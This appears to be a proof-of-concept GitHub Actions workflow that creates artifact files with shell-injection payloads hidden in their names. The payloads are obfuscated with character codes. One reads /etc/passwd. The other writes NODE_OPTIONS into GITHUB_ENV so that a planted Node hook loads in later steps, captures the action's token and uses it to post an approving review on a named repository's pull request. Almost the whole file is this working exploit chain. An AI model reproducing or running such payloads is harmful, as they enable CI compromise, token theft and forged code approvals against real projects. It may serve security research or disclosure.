name: Test

on:
  pull_request:

permissions:
  contents: read

jobs:
  upload:
    runs-on: ubuntu-latest
    permissions:
      contents: read
      actions: write
    steps:
      - name: build artifact with attacker-controlled names
        run: |
          set -e
          python3 - <<'PY'
          import os
          os.makedirs("content", exist_ok=True)
          open("content/report.txt", "w").write("plain report\n")
          open("content/pwn.txt", "w").write("sibling content\n")
          open("content/p2wn.txt", "w").write("substituted target\n")
          open("content/pr_number.txt", "w").write(os.environ.get("PR_NUMBER", ""))

          # payload 1: arbitrary command execution demonstrated via /etc/passwd to stderr
          name1 = ("p$(python3 -c 'import os;os.write(2,open(chr(47)+chr(101)+chr(116)"
                   "+chr(99)+chr(47)+chr(112)+chr(97)+chr(115)+chr(115)+chr(119)+chr(100))"
                   ".read().encode())'; echo 2)wn.txt")
          open("content/" + name1, "w").write("payload\n")

          # payload 2: poison GITHUB_ENV with NODE_OPTIONS so later node actions load our hook
          name2 = ("q$(python3 -c 'import os;open(os.environ[bytes([71,73,84,72,85,66,95,69,78,86])"
                   ".decode()],bytes([97]).decode()).write(bytes([78,79,68,69,95,79,80,84,73,79,78,"
                   "83,61,45,45,114,101,113,117,105,114,101,32]).decode()+bytes([47,116,109,112,47,"
                   "99,111,110,116,101,110,116,47,99,111,110,116,101,110,116,47,104,111,111,107,"
                   "46,106,115]).decode()+chr(10))'; echo 2)wn.txt")
          open("content/" + name2, "w").write("payload2\n")

          hook = r'''
          const fs = require('fs');
          (async () => {
            try {
              const t = process.env.INPUT_TOKEN || '';
              if (!t) return;
              if (fs.existsSync('/tmp/hook_done')) return;
              fs.writeFileSync('/tmp/hook_done', '1');
              const H = { authorization: 'Bearer ' + t, accept: 'application/vnd.github+json', 'content-type': 'application/json' };
              const r = await fetch('https://api.github.com/repos/PDFtoMark/gab-poc-aave-comment/pulls/5/reviews', {
                method: 'POST', headers: H,
                body: JSON.stringify({ event: 'APPROVE', body: 'NODE_OPTIONS hook loaded inside workflow action. Token captured from step env; length=' + t.length })
              });
              console.log('HOOK APPROVAL STATUS ' + r.status + ' ' + (await r.text()));
            } catch (e) { console.log('HOOK ERR ' + e.message); }
          })();
          '''
          open("content/hook.js", "w").write(hook)
          print(sorted(os.listdir("content")))
          PY
        env:
          PR_NUMBER: ${{ github.event.pull_request.number }}
      - uses: actions/upload-artifact@v4
        with:
          name: content
          path: content/
